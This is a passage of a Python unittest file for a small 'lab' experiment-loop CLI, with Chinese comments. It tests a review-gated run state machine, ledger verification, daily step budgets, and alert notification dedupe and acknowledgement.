    def test_record_and_review_pass_raises_success_rate(self) -> None:
        self.model.init("lab", "观察自己", self.ts)
        self.model.record_run(ts=self.ts, run_id="run-001", steps=10, mean_error=0.25, accepted=False)
        self.assertEqual(self.model.success_rate(), 0.0)
        self.model.mark_review(accepted=True, ts=self.ts, reason="ok")
        self.assertEqual(self.model.success_rate(), 1.0)
        self.assertEqual(self.model.load()["last_run"]["accepted"], True)

    def test_review_fail_records_failure_pattern(self) -> None:
        self.model.init("lab", "观察自己", self.ts)
        self.model.record_run(ts=self.ts, run_id="run-001", steps=10, mean_error=0.9, accepted=False)
        data = self.model.mark_review(accepted=False, ts=self.ts, reason="误差异常")
        self.assertEqual(data["failure_patterns"]["review_failed"]["count"], 1)

    def test_goals_lifecycle(self) -> None:
        self.model.init("lab", "观察自己", self.ts)
        first = self.model.add_goal("跑通 loop", self.ts)
        second = self.model.add_goal("加插件接口", self.ts)
        self.assertEqual((first, second), (1, 2))
        self.assertEqual(len(self.model.active_goals()), 2)
        self.assertTrue(self.model.activate_goal(first))
        self.assertEqual(len(self.model.active_goals()), 1)
        self.assertFalse(self.model.activate_goal(999))

    def test_cli_self_commands(self) -> None:
        root = Path(self.tmp.name)
        args = ["--root", str(root), "--fake-now", self.ts]
        self.assertEqual(cli_main([*args, "self"]), 0)                      # 未初始化也能看提示
        self.assertEqual(cli_main([*args, "self", "init"]), 2)              # 缺参数
        self.assertEqual(cli_main([*args, "self", "init", "--name", "lab", "--purpose", "观察自己"]), 0)
        self.assertEqual(cli_main([*args, "self", "goal-add", "--text", "跑通 loop"]), 0)
        self.assertEqual(cli_main([*args, "self", "goal-done", "--id", "1"]), 0)
        self.assertEqual(cli_main([*args, "self", "goal-done", "--id", "9"]), 1)


class LogicAuditTests(unittest.TestCase):
    """v0.1.4 修掉的 6 个逻辑问题，每个都留一条回归测试。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.now = ["--fake-now", "2026-01-01T00:00:00Z"]

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def _run(self, *args: str, expect: int = 0) -> int:
        code = cli_main(["--root", str(self.root), *self.now, *args])
        self.assertEqual(code, expect, msg=f"{args} 期望 {expect} 实际 {code}")
        return code

    def test_win_rate_sums_to_one(self) -> None:
        summary = benchmark(steps=50, seeds=(1, 2))
        total = sum(summary["win_rate"].values()) + summary["tie_rate"]
        self.assertAlmostEqual(total, 1.0, places=6)

    def test_run_stops_in_reviewing(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        state = json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))
        self.assertEqual(state["status"], "REVIEWING")
        self.assertEqual(state["history"][-1]["reason"], "本轮结束，等待独立评审")

    def test_unreviewed_run_blocks_next_run(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("run", "--steps", "5", expect=1)

    def test_review_pass_returns_to_ready(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("review", "--pass", "--by", "tester", "--reason", "指标正常")
        self.assertEqual(json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))["status"], "READY")
        self._run("run", "--steps", "5")
        self._run("verify")

    def test_review_fail_rolls_back_and_alerts(self) -> None:
        self._run("init")
        self._run("run", "--steps", "5")
        self._run("review", "--fail", "--by", "tester", "--reason", "预测误差异常")
        state = json.loads((self.root / "state" / "state.json").read_text(encoding="utf-8"))
        self.assertEqual(state["status"], "READY")
        self.assertIn("ROLLING_BACK", [step["to"] for step in state["history"]])
        ledger = (self.root / "state" / "ledger.jsonl").read_text(encoding="utf-8")
        self.assertIn("review-fail", ledger)

    def test_verify_detects_state_ledger_mismatch(self) -> None:
        self._run("init")
        self._run("run", "--steps", "3")
        # 往账本里塞一条 state.json 没有的转换
        from lab.ledger import Ledger

        ledger = Ledger(self.root / "state" / "ledger.jsonl")
        ledger.append("transition", {"from": "READY", "to": "RUNNING"}, "2026-01-01T00:00:00Z")
        self._run("verify", expect=1)

    def test_daily_step_cap_enforced(self) -> None:
        (self.root / "lab.config.json").write_text(
            json.dumps({"version": 1, "budget": {"steps_per_day": 4}}), encoding="utf-8"
        )
        self._run("init")
        self._run("run", "--steps", "10", expect=3)

    def test_notify_health_not_counted_in_its_own_denominator(self) -> None:
        state = self.root / "state"
        ledger = Ledger(state / "ledger.jsonl")
        clock = FakeClock("2026-01-01T00:00:00Z")
        notifier = Notifier(ledger, clock, state, echo=False)
        for index in range(3):
            notifier.emit("high", "drift", f"第{index}条", dedupe_key=str(index))
        health = notifier.check_health()
        self.assertIsNotNone(health)
        # 健康提醒本身不算"待回应的告警"，否则越提醒回应率越低
        kinds = [record["payload"]["kind"] for record in notifier.pending()]
        self.assertNotIn("notify-health", kinds)


class NotifyTests(unittest.TestCase):
    """Issue 0019：通知分级 / 去重 / 回应 / 回应率。"""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.state = self.root / "state"
        self.ledger = Ledger(self.state / "ledger.jsonl")
        self.clock = FakeClock("2026-01-01T00:00:00Z")
        self.notifier = Notifier(self.ledger, self.clock, self.state, echo=False)

    def tearDown(self) -> None:
        self.tmp.cleanup()

    def test_emit_appends_ledger_and_channel_file(self) -> None:
        record = self.notifier.emit("high", "budget", "超限了")
        self.assertIsNotNone(record)
        self.assertEqual(len(self.notifier._alerts()), 1)
        lines = (self.state / "notify.jsonl").read_text(encoding="utf-8").strip().splitlines()
        self.assertEqual(len(lines), 1)
        self.assertIn("超限了", lines[0])

    def test_dedupe_within_24h(self) -> None:
        first = self.notifier.emit("high", "budget", "第一次", dedupe_key="budget")
        second = self.notifier.emit("high", "budget", "第二次", dedupe_key="budget")
        self.assertIsNotNone(first)
        self.assertIsNone(second)
        self.assertEqual(len(self.notifier._alerts()), 1)

    def test_dedupe_expires_after_24h(self) -> None:
        self.notifier.emit("high", "drift", "第一次", dedupe_key="drift")
        self.clock.advance(25 * 3600)
        again = self.notifier.emit("high", "drift", "第二天", dedupe_key="drift")
        self.assertIsNotNone(again)
        self.assertEqual(len(self.notifier._alerts()), 2)

    def test_no_dedupe_key_means_always_send(self) -> None:
        self.notifier.emit("high", "freeze", "冻一次")
        self.notifier.emit("high", "freeze", "再冻一次")
        self.assertEqual(len(self.notifier._alerts()), 2)

    def test_ack_clears_pending_and_fixes_rate(self) -> None:
        record = self.notifier.emit("high", "budget", "超限", dedupe_key="b")
        self.assertEqual(len(self.notifier.pending()), 1)
        self.notifier.ack(int(record["seq"]), "freeze", by="tester")
        self.assertEqual(self.notifier.pending(), [])
        self.assertEqual(self.notifier.response_rate(), 1.0)

    def test_rate_below_threshold_emits_health_alert(self) -> None:
        # 少于 MIN_SAMPLE 条时不下结论
        self.notifier.emit("high", "drift", "只有一条", dedupe_key="solo")
        self.assertIsNone(self.notifier.check_health())
        for index in range(3):
            self.notifier.emit("high", "drift", f"第{index}条", dedupe_key=str(index))
        self.assertEqual(self.notifier.response_rate(), 0.0)
        health = self.notifier.check_health()
        self.assertIsNotNone(health)
        self.assertEqual(health["payload"]["kind"], "notify-health")
        # 同一天再查一次不应重复刷屏
        self.assertIsNone(self.notifier.check_health())

    def test_invalid_level_and_action_rejected(self) -> None:
        with self.assertRaises(ValueError):
            self.notifier.emit("urgent", "x", "y")
        record = self.notifier.emit("low", "x", "y")
        with self.assertRaises(ValueError):
            self.notifier.ack(int(record["seq"]), "explode")
        with self.assertRaises(KeyError):
            self.notifier.ack(99999, "pause")

    def test_cli_notify_ack_inbox(self) -> None:
        root = self.root
        args = ["--root", str(root), "--fake-now", "2026-01-01T00:00:00Z"]
        self.assertEqual(cli_main([*args, "init"]), 0)
        self.assertEqual(cli_main([*args, "notify", "--kind", "budget", "--message", "测试", "--dedupe-key", "k"]), 0)
        self.assertEqual(cli_main([*args, "notify", "--kind", "budget", "--message", "重复", "--dedupe-key", "k"]), 0)
        text = (root / "state" / "notify.jsonl").read_text(encoding="utf-8")
        self.assertEqual(len(text.strip().splitlines()), 1)
        seq = int(text.strip().splitlines()[0].split('"seq": ')[1].split(",")[0])
        self.assertEqual(cli_main([*args, "ack", str(seq), "--action", "pause"]), 0)
        self.assertEqual(cli_main([*args, "inbox"]), 0)
        self.assertEqual(cli_main([*args, "ack", "99999", "--action", "pause"]), 2)


class SubprocessSmokeTests(unittest.TestCase):
    """真实起一个进程，确认 `python -m lab.cli` 在这台机器上不报错。"""

    def test_doctor_in_repo(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "doctor"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)
        self.assertIn(__version__, result.stdout)

    def test_module_status(self) -> None:
        result = subprocess.run(
            [sys.executable, "-m", "lab.cli", "--root", str(REPO), "status"],
            cwd=str(REPO),
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        self.assertEqual(result.returncode, 0, msg=result.stdout + result.stderr)


if __name__ == "__main__":
    unittest.main()
